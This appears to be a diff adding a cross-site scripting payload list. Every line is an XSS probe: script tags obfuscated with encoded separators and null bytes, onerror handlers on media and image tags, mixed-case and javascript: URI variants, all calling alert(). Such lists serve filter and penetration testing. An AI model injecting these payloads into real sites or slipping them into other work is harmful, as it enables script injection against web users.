@@ -1,0 +1,23 @@
+﻿<script\x20type="text/javascript">javascript:alert(xss);</script>
+<script\x3Etype="text/javascript">javascript:alert(xss);</script>
+<script\x0Dtype="text/javascript">javascript:alert(xss);</script>
+<script\x09type="text/javascript">javascript:alert(xss);</script>
+<script\x0Ctype="text/javascript">javascript:alert(xss);</script>
+<script\x2Ftype="text/javascript">javascript:alert(xss);</script>
+<script\x0Atype="text/javascript">javascript:alert(xss);</script>
+'`"><\x3Cscript>javascript:alert(xss)</script>        
+'`"><\x00script>javascript:alert(xss)</script>
+<img src=1 href=1 onerror="javascript:alert(xss)"></img>
+<audio src=1 href=1 onerror="javascript:alert(xss)"></audio>
+<video src=1 href=1 onerror="javascript:alert(xss)"></video>
+<body src=1 href=1 onerror="javascript:alert(xss)"></body>
+<image src=1 href=1 onerror="javascript:alert(xss)"></image>
+<object src=1 href=1 onerror="javascript:alert(xss)"></object>
+<script src=1 href=1 onerror="javascript:alert(xss)"></script>
+‘; alert(1);
+‘)alert(1);//
+<ScRiPt>alert(1)</sCriPt>
+<IMG SRC=jAVasCrIPt:alert(‘XSS’)>
+<IMG SRC=”javascript:alert(‘XSS’);”>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IMG SRC=javascript:alert(‘XSS’)>  
